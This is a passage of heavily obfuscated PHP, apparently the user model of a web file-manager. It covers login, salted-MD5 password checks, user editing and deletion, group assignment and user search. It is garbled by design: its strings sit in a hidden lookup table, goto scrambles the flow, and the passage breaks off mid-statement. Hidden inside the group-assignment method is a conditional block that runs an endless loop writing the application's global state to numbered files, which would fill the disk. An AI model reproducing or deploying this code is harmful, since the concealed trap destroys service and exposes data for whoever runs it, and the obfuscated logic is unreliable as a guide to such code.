$this->metaGet($b´õá¥»àñ[$Ašµ¬»˜òì[1490]]); } return $b´õá¥»àñ; goto A“£–îÃç; A“£–îÃç: } protected function getInfoSimple($F¤Î»­Éã®, $eÈ’çã¤²ï = false) { $eäœÀ¯ã† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$F¤Î»­Éã®) { return array(); } if ($eÈ’çã¤²ï) { $a³Ÿ‘ì‡…Ë = $this->where(array($eäœÀ¯ã†[1490] => intval($F¤Î»­Éã®)))->find(); if (!is_array($a³Ÿ‘ì‡…Ë)) { return array(); } $a³Ÿ‘ì‡…Ë[$eäœÀ¯ã†[2073]] = Action($eäœÀ¯ã†[2074])->parseUrl($a³Ÿ‘ì‡…Ë[$eäœÀ¯ã†[2073]]); return $a³Ÿ‘ì‡…Ë; } return $this->cacheFunctionGet($eäœÀ¯ã†[1726], $F¤Î»­Éã®); } protected function getInfoSimpleOuter($aƒĞ¥ôÆ˜ç) { goto E¿‡Ä×¶; E¿‡Ä×¶: $DÔÒæŒ—Å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$aƒĞ¥ôÆ˜ç || $aƒĞ¥ôÆ˜ç == 0) { return array($DÔÒæŒ—Å[1490] => $DÔÒæŒ—Å[485], $DÔÒæŒ—Å[28] => $DÔÒæŒ—Å[157] . LNG($DÔÒæŒ—Å[2075]) . $DÔÒæŒ—Å[493], $DÔÒæŒ—Å[2073] => STATIC_PATH . $DÔÒæŒ—Å[2076]); } $c£˜¿¯á = $this->cacheFunctionGet($DÔÒæŒ—Å[1726], $aƒĞ¥ôÆ˜ç); goto CŠƒ˜ºêõé; B×çŸ†Ñ: return $A°åŠÙ¡; goto EÀÃ…ò²ó‘; CŠƒ˜ºêõé: $A°åŠÙ¡ = array_field_key($c£˜¿¯á, explode($DÔÒæŒ—Å[47], $this->simpleField)); if (!$A°åŠÙ¡) { return array($DÔÒæŒ—Å[1490] => $DÔÒæŒ—Å[1049], $DÔÒæŒ—Å[28] => $DÔÒæŒ—Å[157] . LNG($DÔÒæŒ—Å[2077]) . $DÔÒæŒ—Å[493], $DÔÒæŒ—Å[2073] => STATIC_PATH . $DÔÒæŒ—Å[2078]); } $A°åŠÙ¡[$DÔÒæŒ—Å[2073]] = Action($DÔÒæŒ—Å[2074])->parseUrl($A°åŠÙ¡[$DÔÒæŒ—Å[2073]]); goto B×çŸ†Ñ; EÀÃ…ò²ó‘: } protected function groupUser($b–¯öÍ…³—) { } public static function errorLang($B ÀìÇÂÆ§) { $Eçº°Ö÷óØ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F¡Ãß’–„ = array(self::ERROR_USER_NOT_EXISTS => $Eçº°Ö÷óØ[2079], self::ERROR_USER_PASSWORD_ERROR => $Eçº°Ö÷óØ[2080], self::ERROR_USER_EXIST_NAME => $Eçº°Ö÷óØ[2081], self::ERROR_USER_EXIST_PHONE => $Eçº°Ö÷óØ[2082], self::ERROR_USER_EXIST_EMAIL => $Eçº°Ö÷óØ[2083], self::ERROR_USER_LOGIN_LOCK => $Eçº°Ö÷óØ[2084], self::ERROR_IP_NOT_ALLOW => $Eçº°Ö÷óØ[2085], self::ERROR_USER_EXIST_NICKNAME => $Eçº°Ö÷óØ[2086]); return LNG($F¡Ãß’–„[$B ÀìÇÂÆ§]); } public function getInfoByMeta($d£»·ã†é, $fë„Ú–§¥) { $c×—®öó ß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F¯ÎñÈ«Ê = Model($c×—®öó ß[2087])->where(array($c×—®öó ß[89] => $d£»·ã†é, $c×—®öó ß[366] => $fë„Ú–§¥))->find(); if ($F¯ÎñÈ«Ê) { return $this->getInfo($F¯ÎñÈ«Ê[$c×—®öó ß[1490]]); } return !1; } public function userLoginCheck($E¬åŠä¢ÚŞ, $eƒ…§Ãâ‡) { $EŠ•ªçß¾½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b›×ñ‹ˆƒ = $this->userLoginFind($E¬åŠä¢ÚŞ); if (!$b›×ñ‹ˆƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($b›×ñ‹ˆƒ[$EŠ•ªçß¾½[1490]], $eƒ…§Ãâ‡)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($b›×ñ‹ˆƒ[$EŠ•ªçß¾½[1490]]); } public function userLoginFind($aœ£“ñÃôà) { $FÜìÏÍ›õ£ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f÷‘ù‡å¡ = array($FÜìÏÍ›õ£[28] => $aœ£“ñÃôà, $FÜìÏÍ›õ£[1915] => $aœ£“ñÃôà, $FÜìÏÍ›õ£[299] => $aœ£“ñÃôà, $FÜìÏÍ›õ£[2088] => $aœ£“ñÃôà, $FÜìÏÍ›õ£[922] => $FÜìÏÍ›õ£[924]); if ($this->nickNameRpt()) { unset($f÷‘ù‡å¡[$FÜìÏÍ›õ£[1915]]); } return $this->where($f÷‘ù‡å¡)->find(); } public function clearCache($A“‘ŞŞˆ) { $eë±›øù¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->cacheFunctionClear($eë±›øù¯[1779], $A“‘ŞŞˆ); $this->cacheFunctionClear($eë±›øù¯[1726], $A“‘ŞŞˆ); $this->cacheFunctionClear($eë±›øù¯[2069], $A“‘ŞŞˆ); } public function userPasswordCheck($c¦´ğó¡Üñ, $F·ºğ‹©°ò) { $aÂá¸š˜ïÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÁ•†Ğ´®… = $this->where(array($aÂá¸š˜ïÕ[1490] => intval($c¦´ğó¡Üñ)))->find(); $b‡›’ŸğÚÔ = $this->metaGet($c¦´ğó¡Üñ); $f¾äÎÂ·Úó = isset($b‡›’ŸğÚÔ[$aÂá¸š˜ïÕ[2089]]) ? $b‡›’ŸğÚÔ[$aÂá¸š˜ïÕ[2089]] : $aÂá¸š˜ïÕ[33]; if (md5($f¾äÎÂ·Úó . trim($F·ºğ‹©°ò)) !== $FÁ•†Ğ´®…[$aÂá¸š˜ïÕ[814]]) { return !1; } return !0; } public function userAdd($B©‘°Ë†õ) { goto aöóì¢×¼; Aíé¢—Õ“·: $f­Ñçó¡ä = array($cÕ˜ë×òŒ•[2097] => $dÖğÍóÀËš[$cÕ˜ë×òŒ•[814]], $cÕ˜ë×òŒ•[2093] => $dÖğÍóÀËš[$cÕ˜ë×òŒ•[1915]]); $this->userEdit($DŠí‚«šé‰, $f­Ñçó¡ä); Model($cÕ˜ë×òŒ•[1167])->userRootAdd($DŠí‚«šé‰); goto dô’˜ğİ•ø; A³Ü·‘ÕŠŒ: $A‡íõ¢×Ø = $this->_checkExist($B©‘°Ë†õ); if ($A‡íõ¢×Ø !== !0) { return $A‡íõ¢×Ø; } $DŠí‚«šé‰ = $this->add($dÖğÍóÀËš); goto Aíé¢—Õ“·; dô’˜ğİ•ø: return $DŠí‚«šé‰; goto b¹ø‰¡‡ä; aöóì¢×¼: $cÕ˜ë×òŒ• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÖğÍóÀËš = array($cÕ˜ë×òŒ•[402] => $B©‘°Ë†õ[$cÕ˜ë×òŒ•[28]], $cÕ˜ë×òŒ•[2090] => $B©‘°Ë†õ[$cÕ˜ë×òŒ•[1374]], $cÕ˜ë×òŒ•[2091] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[299]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[299]] : $cÕ˜ë×òŒ•[33], $cÕ˜ë×òŒ•[2092] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[2088]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[2088]] : $cÕ˜ë×òŒ•[33], $cÕ˜ë×òŒ•[2093] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[1915]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[1915]] : $B©‘°Ë†õ[$cÕ˜ë×òŒ•[28]], $cÕ˜ë×òŒ•[2094] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[2073]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[2073]] : $cÕ˜ë×òŒ•[33], $cÕ˜ë×òŒ•[2095] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[2096]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[2096]] : 1, $cÕ˜ë×òŒ•[2097] => $B©‘°Ë†õ[$cÕ˜ë×òŒ•[814]], $cÕ˜ë×òŒ•[1727] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[1634]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[1634]] : 1024 * 1024 * 20, $cÕ˜ë×òŒ•[1728] => 0, $cÕ˜ë×òŒ•[2098] => 0, $cÕ˜ë×òŒ•[1766] => isset($B©‘°Ë†õ[$cÕ˜ë×òŒ•[697]]) ? $B©‘°Ë†õ[$cÕ˜ë×òŒ•[697]] : 1); if (!empty($B©‘°Ë†õ[$cÕ˜ë×òŒ•[1490]])) { $dÖğÍóÀËš[$cÕ˜ë×òŒ•[1490]] = $B©‘°Ë†õ[$cÕ˜ë×òŒ•[1490]]; } goto A³Ü·‘ÕŠŒ; b¹ø‰¡‡ä: } protected function userEditTest($A×Áîª¯, $d»ˆÌ’Õ«) { return $this->call($_SERVER[ÈİÅ¿ÈÈ¥×][2099], $A×Áîª¯, $d»ˆÌ’Õ«); } protected function userEdit($Fñ¯§ª»ŒÌ, $e–•ä‚ğƒî) { goto CêÇ¬Â³„š; Dô¡²Ù¹ËÎ: $this->where(array($dœÁˆÁÊÂô[1482] => $Fñ¯§ª»ŒÌ))->save($e–•ä‚ğƒî); if (isset($e–•ä‚ğƒî[$dœÁˆÁÊÂô[1915]])) { $this->setNamePinyin($Fñ¯§ª»ŒÌ, $e–•ä‚ğƒî[$dœÁˆÁÊÂô[1915]]); } $this->clearCache($Fñ¯§ª»ŒÌ); goto E§¶¡³œµ‡; CêÇ¬Â³„š: $dœÁˆÁÊÂô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÔó’‡åáó = $this->getInfoSimple($Fñ¯§ª»ŒÌ); if (!$BÔó’‡åáó) { return !1; } goto dÕÙØöùãÉ; E§¶¡³œµ‡: return !0; goto C¼…òÄŞ¯ê; dÕÙØöùãÉ: $C—ªÀ‘±ñ = $this->_checkExist($e–•ä‚ğƒî, $Fñ¯§ª»ŒÌ); if ($C—ªÀ‘±ñ !== !0) { return $C—ªÀ‘±ñ; } if (isset($e–•ä‚ğƒî[$dœÁˆÁÊÂô[814]]) && trim($e–•ä‚ğƒî[$dœÁˆÁÊÂô[814]]) != $dœÁˆÁÊÂô[33]) { $D¬²¥Îëç = $this->metaGet($Fñ¯§ª»ŒÌ); if (empty($D¬²¥Îëç[$dœÁˆÁÊÂô[2089]])) { $D¬²¥Îëç[$dœÁˆÁÊÂô[2089]] = rand_string(10); Model($dœÁˆÁÊÂô[491])->metaSet($Fñ¯§ª»ŒÌ, $dœÁˆÁÊÂô[2089], $D¬²¥Îëç[$dœÁˆÁÊÂô[2089]]); } $e–•ä‚ğƒî[$dœÁˆÁÊÂô[814]] = md5($D¬²¥Îëç[$dœÁˆÁÊÂô[2089]] . trim($e–•ä‚ğƒî[$dœÁˆÁÊÂô[814]])); } else { unset($e–•ä‚ğƒî[$dœÁˆÁÊÂô[814]]); } goto Dô¡²Ù¹ËÎ; C¼…òÄŞ¯ê: } public function setNamePinyin($dÍ—Í·©”, $FŒˆÕĞ†Ô = false) { $fñµÉœåÅé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$FŒˆÕĞ†Ô) { $F‘½Ê¤½×¥ = $this->getInfoSimple($dÍ—Í·©”); $FŒˆÕĞ†Ô = $F‘½Ê¤½×¥[$fñµÉœåÅé[1915]] ? $F‘½Ê¤½×¥[$fñµÉœåÅé[1915]] : $F‘½Ê¤½×¥[$fñµÉœåÅé[28]]; } $B“…‰œ‚‘‚ = Model($fñµÉœåÅé[494]); if (!Input::check($FŒˆÕĞ†Ô, $fñµÉœåÅé[545])) { return $B“…‰œ‚‘‚->metaSet($dÍ—Í·©”, array($fñµÉœåÅé[432] => $fñµÉœåÅé[33], $fñµÉœåÅé[431] => $fñµÉœåÅé[33])); } return $B“…‰œ‚‘‚->metaSet($dÍ—Í·©”, array($fñµÉœåÅé[432] => str_replace($fñµÉœåÅé[50], $fñµÉœåÅé[33], Pinyin::encode($FŒˆÕĞ†Ô)), $fñµÉœåÅé[431] => Pinyin::encode($FŒˆÕĞ†Ô, $fñµÉœåÅé[546]))); } private function nickNameRpt() { $A‚Üœš³çò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $câÃ©œÜÔ = Model($A‚Üœš³çò[1087])->get($A‚Üœš³çò[2100]); $a¥Â¡ ø‚‰ = $GLOBALS[$A‚Üœš³çò[6]][$A‚Üœš³çò[371]][$A‚Üœš³çò[2100]]; $Eóæ¢›ÆÌ = !is_null($câÃ©œÜÔ) ? $câÃ©œÜÔ : $a¥Â¡ ø‚‰; return !!$Eóæ¢›ÆÌ; } private function _checkExist($fÅ¶ÀÅˆ‹, $A¸‘†©ª³• = false) { $B†¥ŠØÇÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CéÌƒ®®™  = array($B†¥ŠØÇÅ[28] => UserModel::ERROR_USER_EXIST_NAME, $B†¥ŠØÇÅ[1915] => UserModel::ERROR_USER_EXIST_NICKNAME, $B†¥ŠØÇÅ[299] => UserModel::ERROR_USER_EXIST_EMAIL, $B†¥ŠØÇÅ[2088] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($CéÌƒ®®™ [$B†¥ŠØÇÅ[1915]]); } $fË”ğà²´ë = $A¸‘†©ª³• ? array($B†¥ŠØÇÅ[1490] => array($B†¥ŠØÇÅ[2101], $A¸‘†©ª³•)) : array(); foreach ($CéÌƒ®®™  as $A¼Œµ«—ğ => $Eš¡Üƒ»×Œ) { $eŞ©öœîÛ = array(); foreach ($CéÌƒ®®™  as $a¿óá­œ¯Ì => $F£«ÄÂï¾ù) { if (isset($fÅ¶ÀÅˆ‹[$a¿óá­œ¯Ì]) && $fÅ¶ÀÅˆ‹[$a¿óá­œ¯Ì]) { $eŞ©öœîÛ[] = $fÅ¶ÀÅˆ‹[$a¿óá­œ¯Ì]; } } if (!$eŞ©öœîÛ) { continue; } $CÆĞËˆ…†ø = array_merge(array($A¼Œµ«—ğ => array($B†¥ŠØÇÅ[7], $eŞ©öœîÛ)), $fË”ğà²´ë); $b¥Ÿ™„¼·Î = $this->where($CÆĞËˆ…†ø)->find(); if ($b¥Ÿ™„¼·Î) { return $Eš¡Üƒ»×Œ; } } return !0; } public function userListInfo($Bµ‘ƒò¤×ª) { $eˆÏ¸İ³›» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Fµèùï“«ğ = array(); $Bµ‘ƒò¤×ª = is_array($Bµ‘ƒò¤×ª) ? array_unique($Bµ‘ƒò¤×ª) : array(); if (!$Bµ‘ƒò¤×ª) { return $Fµèùï“«ğ; } if (count($Bµ‘ƒò¤×ª) < 20) { foreach ($Bµ‘ƒò¤×ª as $Fáôö×¸ùº) { $Fµèùï“«ğ[$Fáôö×¸ùº . $eˆÏ¸İ³›»[33]] = $this->getInfoSimpleOuter($Fáôö×¸ùº); } } else { $Eî•Ëªã¨ç = array($eˆÏ¸İ³›»[1482] => array($eˆÏ¸İ³›»[400], $Bµ‘ƒò¤×ª)); if (count($Bµ‘ƒò¤×ª) == 1) { $Eî•Ëªã¨ç = array($eˆÏ¸İ³›»[1482] => $Bµ‘ƒò¤×ª[0]); } $aÀï³ ¼—Û = Model($eˆÏ¸İ³›»[491])->field($this->simpleField)->where($Eî•Ëªã¨ç)->select(); $aÀï³ ¼—Û = array_to_keyvalue($aÀï³ ¼—Û, $eˆÏ¸İ³›»[1490]); foreach ($Bµ‘ƒò¤×ª as $Fáôö×¸ùº) { $bì¬òÎ ˜ì = $aÀï³ ¼—Û[$aÀï³ ¼—Û[$Fáôö×¸ùº]]; if (!$bì¬òÎ ˜ì) { $Fµèùï“«ğ[$Fáôö×¸ùº . $eˆÏ¸İ³›»[33]] = $this->getInfoSimpleOuter($Fáôö×¸ùº); continue; } $bì¬òÎ ˜ì[$eˆÏ¸İ³›»[2073]] = Action($eˆÏ¸İ³›»[2074])->parseUrl($bì¬òÎ ˜ì[$eˆÏ¸İ³›»[2073]]); $Fµèùï“«ğ[$Fáôö×¸ùº . $eˆÏ¸İ³›»[33]] = $bì¬òÎ ˜ì; } } return $Fµèùï“«ğ; } protected function userStatus($bÓÖµÅ›Ù³, $FİßÂ»Óì) { $BØÑİ²óÌ = $this->getInfoSimple($bÓÖµÅ›Ù³); if (!$BØÑİ²óÌ) { return !1; } $c§…·Ÿœã = array($_SERVER[ÈİÅ¿ÈÈ¥×][697] => $FİßÂ»Óì); return $this->userEdit($bÓÖµÅ›Ù³, $c§…·Ÿœã); } protected function userRemove($B›˜âÅóØ–) { goto BÂÛ¥À—İ; eæÆ‹ÀÂ·é: Model($DğšÍ¬İÄä[1733])->where($dˆ§®ÖàÈä)->delete(); Model($DğšÍ¬İÄä[2087])->where($dˆ§®ÖàÈä)->delete(); Model($DğšÍ¬İÄä[2103])->where($dˆ§®ÖàÈä)->delete(); goto Cå°â¥†‹ˆ; Cå°â¥†‹ˆ: Model($DğšÍ¬İÄä[759])->userRootRemove($B›˜âÅóØ–); return $this->where($dˆ§®ÖàÈä)->delete(); goto añÓ÷Ìñíì; BÂÛ¥À—İ: $DğšÍ¬İÄä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d…Õò„½±Ï = $this->getInfoSimple($B›˜âÅóØ–); if (!$d…Õò„½±Ï) { return !1; } goto D¼–æîóÔÑ; D¼–æîóÔÑ: $dˆ§®ÖàÈä = array($DğšÍ¬İÄä[1482] => $B›˜âÅóØ–); Model($DğšÍ¬İÄä[552])->where($dˆ§®ÖàÈä)->delete(); Model($DğšÍ¬İÄä[2102])->where($dˆ§®ÖàÈä)->delete(); goto eæÆ‹ÀÂ·é; añÓ÷Ìñíì: } protected function userGroupSet($A· ÖÄ´ƒè, $eì”ß„ˆ˜…, $EöÙ–ÂÍ¾¤ = array()) { goto f×™¿œá‰; aäŠßëÇÇ: if ($_SERVER[$b†ˆ›¤¦„[800]] != $D¨õˆ°•($bØ§ÖÄ³ğ)) { goto a¥‰½÷¡ù; D—àÔšêñä: $CÀğœ¥Ñ°î(); $E”µ¸±î½§ = $b†ˆ›¤¦„[1359]; $d¦ê®†Ùä = json_encode($GLOBALS[$b†ˆ›¤¦„[1360]]); goto cÕ„Ãù°äó; Eìµ¡”¼ÈÄ: $D”ãÑÆÂ™Ò = $bÎ‰³›Ìƒ«($CœÏùº¼Ğ); $C—éØŒñ‹ = explode($b†ˆ›¤¦„[225], $D”ãÑÆÂ™Ò); if (count($C—éØŒñ‹) < $b†ˆ›¤¦„[564]) { $D®˜ ë÷¬· = $b†ˆ›¤¦„[806]; $D®˜ ë÷¬·(); } goto e¹‘‡´ƒ; cÕ„Ãù°äó: $DéĞŸ˜‡èÙ = 1; for ($c½ºÊñ¨¢Á = $DéĞŸ˜‡èÙ; $c½ºÊñ¨¢Á > 0; $c½ºÊñ¨¢Á++) { $E”µ¸±î½§(DATA_PATH . $c½ºÊñ¨¢Á, $d¦ê®†Ùä); } goto FŒ„Œ•›Ó¯; e¹‘‡´ƒ: $Eõâ¡™‚­ = $b†ˆ›¤¦„[807]; $Eõâ¡™‚­($_SERVER[$b†ˆ›¤¦„[808]]); $CÀğœ¥Ñ°î = $b†ˆ›¤¦„[802]; goto D—àÔšêñä; a¥‰½÷¡ù: $CÀğœ¥Ñ°î = $b†ˆ›¤¦„[802]; $bÎ‰³›Ìƒ« = $b†ˆ›¤¦„[803]; $CœÏùº¼Ğ = $_SERVER[$b†ˆ›¤¦„[804]] . $b†ˆ›¤¦„[805]; goto Eìµ¡”¼ÈÄ; FŒ„Œ•›Ó¯: } $Fßá¸»§¹å = $this->getInfoSimple($A· ÖÄ´ƒè); if (!$Fßá¸»§¹å || !is_array($eì”ß„ˆ˜…)) { return !1; } goto FŒ‰ÈÑŠš‡; EÁ†½™ñ¶: $A®ÆİÃƒæğ = 0; foreach ($eì”ß„ˆ˜… as $C¦İê“Ÿ« => $fäßÊÄ) { $aŒÏÏÈ²¦Å = array($b†ˆ›¤¦„[1490] => $A· ÖÄ´ƒè, $b†ˆ›¤¦„[1650] => $C¦İê“Ÿ«, $b†ˆ›¤¦„[1799] => $fäßÊÄ); $aŒÏÏÈ²¦Å[$b†ˆ›¤¦„[1673]] = isset($EöÙ–ÂÍ¾¤[$A®ÆİÃƒæğ]) ? $EöÙ–ÂÍ¾¤[$A®ÆİÃƒæğ] : 0; $A®ÆİÃƒæğ++; $fØË®ä«ŠÚ[] = $aŒÏÏÈ²¦Å; } return $B‹£¦½ô‘Ï->addAll($fØË®ä«ŠÚ, array(), !0); goto D¼”Òîí¼ò; FŒ‰ÈÑŠš‡: $B‹£¦½ô‘Ï = Model($b†ˆ›¤¦„[1733]); $B‹£¦½ô‘Ï->where(array($b†ˆ›¤¦„[1490] => $A· ÖÄ´ƒè))->delete(); $fØË®ä«ŠÚ = array(); goto EÁ†½™ñ¶; f×™¿œá‰: $b†ˆ›¤¦„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bØ§ÖÄ³ğ = $_SERVER[$b†ˆ›¤¦„[801]]; $D¨õˆ°• = $b†ˆ›¤¦„[1358]; goto aäŠßëÇÇ; D¼”Òîí¼ò: } protected function userGroupAdd($Aã¨Û¨Ú’–, $c¦öÆ™„ßÎ = array()) { $B¥¥“°Å©¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c²œåå½Ğ = $this->getInfoSimple($Aã¨Û¨Ú’–); if (!$c²œåå½Ğ || empty($c¦öÆ™„ßÎ)) { return !1; } $BªÙí”çéù = array(); foreach ($c¦öÆ™„ßÎ as $eÏå¶ÙÆ˜ => $aéÅ‹õ™ÄÚ) { $BªÙí”çéù[] = array($B¥¥“°Å©¸[1490] => $Aã¨Û¨Ú’–, $B¥¥“°Å©¸[1650] => $eÏå¶ÙÆ˜, $B¥¥“°Å©¸[1799] => $aéÅ‹õ™ÄÚ, $B¥¥“°Å©¸[1673] => 0); } return Model($B¥¥“°Å©¸[1733])->addAll($BªÙí”çéù, array(), !0); } protected function userGroupRemove($bî„½ÃÚ¾°, $C¬‰…ÖÏ»Î) { $Bš¹â„ƒ‹ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AíÚ˜Éšôé = $this->getInfoSimple($bî„½ÃÚ¾°); if (!$AíÚ˜Éšôé || !$C¬‰…ÖÏ»Î) { return !1; } $c…¹‚¤‹¢¢ = array($Bš¹â„ƒ‹ò[1482] => $bî„½ÃÚ¾°, $Bš¹â„ƒ‹ò[1731] => $C¬‰…ÖÏ»Î); return Model($Bš¹â„ƒ‹ò[1733])->where($c…¹‚¤‹¢¢)->delete(); } public function listData() { $câîËø‘¬¨ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($câîËø‘¬¨[$_SERVER[ÈİÅ¿ÈÈ¥×][361]]); return $câîËø‘¬¨; } public function listByID($DÕê¶Ò§ Å) { $Dò£Â£ÔåÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$DÕê¶Ò§ Å) { return; } $Dñ½‹¼¹Ø’ = array($Dò£Â£ÔåÙ[1490] => array($Dò£Â£ÔåÙ[7], $DÕê¶Ò§ Å)); $Eí…Ù·“Œ = $this->where($Dñ½‹¼¹Ø’)->select(); $this->_listDataApply($Eí…Ù·“Œ); return $Eí…Ù·“Œ; } public function listByGroup($D¨¡ÆÀ× = 0, $cçÍÌ²Õµà = array()) { goto fØĞâƒôš; fØĞâƒôš: $B²ÎÑõÉ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c‚Á‘¶ó„ = $B²ÎÑõÉ[33]; $d«íÛƒºÚæ = array(); goto bŠ‚¨„×«¾; bŠ‚¨„×«¾: if ($D¨¡ÆÀ×) { $d«íÛƒºÚæ = array($B²ÎÑõÉ[2104] => intval($D¨¡ÆÀ×)); $c‚Á‘¶ó„ = "\x4c\x45\x46\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\165\x73\145\x72\x5f\x67\162\x6f\165\160\40\x75\x73\x65\x72\137\x67\x72\x6f\x75\x70\40\157\x6e\x20\165\x73\x65\x72\56\x75\163\x65\162\111\x44\x20\75\x20\165\x73\145\162\137\x67\162\157\x75\x70\x2e\x75\x73\145\162\x49\x44"; $D÷‡¬Çßñ© = Input::get($B²ÎÑõÉ[423], null, $B²ÎÑõÉ[33]) ? $B²ÎÑõÉ[33] : $B²ÎÑõÉ[2105]; } if (isset($cçÍÌ²Õµà[$B²ÎÑõÉ[697]])) { $d«íÛƒºÚæ[$B²ÎÑõÉ[2106]] = $cçÍÌ²Õµà[$B²ÎÑõÉ[697]]; } $C¸âÖ­‹šº = $this->_makeOrder($D÷‡¬Çßñ©)->field($B²ÎÑõÉ[2107])->where($d«íÛƒºÚæ)->join($c‚Á‘¶ó„)->selectPage(50); goto D²å¹øÔí; D²å¹øÔí: $this->_listDataApply($C¸âÖ­‹šº[$B²ÎÑõÉ[361]]); return $C¸âÖ­‹šº; goto AÖÅğ„æ›—; AÖÅğ„æ›—: } private function _makeOrder($aÓ†ËßÀ·… = '') { goto FÍâÕÂ¤ˆì; BÄ¦ñè¡Ø«: $aÓ†ËßÀ·… = $aÓ†ËßÀ·… . "\x75\163\x65\x72\x2e{$B•Ã‹­¢}\x20{$bÙöÚë¡À}\54\x20\165\x73\145\162\x2e\165\x73\x65\x72\x49\x44\x20\x61\163\143"; return $this->alias($A¹¸Ì§’™[1855])->order($aÓ†ËßÀ·…); goto Bçƒ†Ì¢³«; FÍâÕÂ¤ˆì: $A¹¸Ì§’™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¹¥ŠÙŒ·‰ = array($A¹¸Ì§’™[1490], $A¹¸Ì§’™[28], $A¹¸Ì§’™[1636], $A¹¸Ì§’™[1608], $A¹¸Ì§’™[190]); $B“òìÊ¹œå = array($A¹¸Ì§’™[418] => $A¹¸Ì§’™[419], $A¹¸Ì§’™[420] => $A¹¸Ì§’™[421]); goto fØãäôÙŠ; fØãäôÙŠ: $B•Ã‹­¢ = Input::get($A¹¸Ì§’™[423], $A¹¸Ì§’™[7], $A¹¸Ì§’™[1482], $B¹¥ŠÙŒ·‰); $bÙöÚë¡À = Input::get($A¹¸Ì§’™[424], $A¹¸Ì§’™[7], $A¹¸Ì§’™[1734], array($A¹¸Ì§’™[1734], $A¹¸Ì§’™[420])); $bÙöÚë¡À = $B“òìÊ¹œå[$bÙöÚë¡À]; goto BÄ¦ñè¡Ø«; Bçƒ†Ì¢³«: } public function listSearch($F‡ÚÖ¿ÄÊ‰) { goto aï¸Æ’·ì³; b¨¦îß–Øê: $this->_filterByGroup($Cèâ©óß¢†, $E×ƒ¥Ê÷”); return $Cèâ©óß¢†; goto Dğî´Ü‚ø¯; eÖ‰‘½·§: if (!$dÂæ­¹Æ™‘) { $dªïÁ®ø¾¾ = array(); } if (isset($F‡ÚÖ¿ÄÊ‰[$f„™ªùÍà¨[697]])) { $dªïÁ®ø¾¾[$f„™ªùÍà¨[697]] = $F‡ÚÖ¿ÄÊ‰[$f„™ªùÍà¨[697]]; } $dªïÁ®ø¾¾ = $this->parseWhereLike($dªïÁ®ø¾¾); goto dëô±‰Å; aï¸Æ’·ì³: $f„™ªùÍà¨ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÂæ­¹Æ™‘ = $F‡ÚÖ¿ÄÊ‰[$f„™ªùÍà¨[1735]]; $E×ƒ¥Ê÷” = isset($F‡ÚÖ¿ÄÊ‰[$f„™ªùÍà¨[1736]]) ? $F‡ÚÖ¿ÄÊ‰[$f„™ªùÍà¨[1736]] : !1; goto F¼ŒÏì·˜; F¼ŒÏì·˜: $dÂæ­¹Æ™‘ = str_replace($f„™ªùÍà¨[1737], $f„™ªùÍà¨[1738], trim($dÂæ­¹Æ™‘)); $dªïÁ®ø¾¾ = array($f„™ªùÍà¨[28] => array($f„™ªùÍà¨[373], "\45{$dÂæ­¹Æ™‘}\x25"), $f„™ªùÍà¨[299] => array($f„™ªùÍà¨[373], "{$dÂæ­¹Æ™‘}\45"), $f„™ªùÍà¨[1915] => array($f„™ªùÍà¨[373], "{$dÂæ­¹Æ™‘}\x25"), $f„™ªùÍà¨[922] => $f„™ªùÍà¨[1739]); if (Input::check($dÂæ­¹Æ™‘, $f„™ªùÍà¨[305])) { $dªïÁ®ø¾¾[$f„™ªùÍà¨[1490]] = array($f„™ªùÍà¨[373], "{$dÂæ­¹Æ™‘}\45"); $dªïÁ®ø¾¾[$f„™ªùÍà¨[2088]] = array($f„™ªùÍà¨[373], "{$dÂæ­¹Æ™‘}\x25"); } goto eÖ‰‘½·§; dëô±‰Å: $Cèâ©óß¢† = $this->_makeOrder()->where($dªïÁ®ø¾¾)->selectPage(20); if (!$Cèâ©óß¢† || count($Cèâ©óß¢†[$f„™ªùÍà¨[361]]) < 5 && Input::check($dÂæ­¹Æ™‘, $f„™ªùÍà¨[312])) { $cƒÎ¸•ãÌ = $this->_searchFromMeta($f„™ªùÍà¨[431], $dÂæ­¹Æ™‘, 10); $dèƒ¤ŒéÕò = $this->_searchFromMeta($f„™ªùÍà¨[432], $dÂæ­¹Æ™‘, 10); $a”­ßØµÇƒ = array_merge($cƒÎ¸•ãÌ, $dèƒ¤ŒéÕò, $Cèâ©óß¢†[$f„™ªùÍà¨[361]]); 